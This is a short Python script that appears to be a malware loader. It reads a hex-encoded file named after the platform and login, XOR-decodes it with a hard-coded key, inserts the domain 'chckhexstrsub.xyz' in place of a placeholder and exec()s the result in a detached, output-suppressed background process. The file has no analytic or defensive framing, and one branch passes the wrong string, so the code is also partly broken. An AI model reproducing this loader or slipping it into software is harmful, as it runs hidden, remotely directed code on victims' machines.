
import base64
import sys
import os
import subprocess
import random
import string
import platform

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

struri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)
strsfx = "/"
if platform.system()[0] == 'W':
    strsfx = '\\'
pypathstr = sys.executable

pyexecstr = os.getcwd() + strsfx + platform.system()[0] + os.getlogin()

pyexeccmd = 'strencdat = "' + pyexecstr + '.dat"; f = open(strencdat, "r"); strenc = f.read(); encbytearray = bytearray.fromhex(strenc); binkey = bytearray.fromhex("5BFC903D878A"); inputarray_21 = bytearray([encbytearray[i] ^ binkey[i % 6] for i in range(0, len(encbytearray))]); exec(inputarray_21.decode("ascii").replace("ADDRS","chckhexstrsub.xyz"));'

pyexewcmd = 'strencdat = "' + pyexecstr + '.dat"; f = open(strencdat, "r"); strenc = f.read(); encbytearray = bytearray.fromhex(strenc); binkey = bytearray.fromhex("5BFC903D878A"); inputarray_21 = bytearray([encbytearray[i] ^ binkey[i % 6] for i in range(0, len(encbytearray))]); exec(inputarray_21.decode("ascii").replace("ADDRS","chckhexstrsub.xyz"));'
#pyexewcmd = 'strencdat = \"' + pyexecstr + '.dat\"; f = open(strencdat, \"r\"); strenc = f.read(); encbytearray = bytearray.fromhex(strenc); binkey = bytearray.fromhex(\"5BFC903D878A\"); inputarray_21 = bytearray([encbytearray[i] ^ binkey[i % 6] for i in range(0, len(encbytearray))]); exec(inputarray_21.decode(\"ascii\").replace(\"ADDRS\",\"www.google.com\"));'
if os.path.isfile(pyexecstr) :
    if platform.system()[0] == 'W':
        pid = subprocess.Popen([pypathstr, '-c', pyexewcmd], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) 
    else:
        subprocess.Popen([pypathstr, '-c', pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)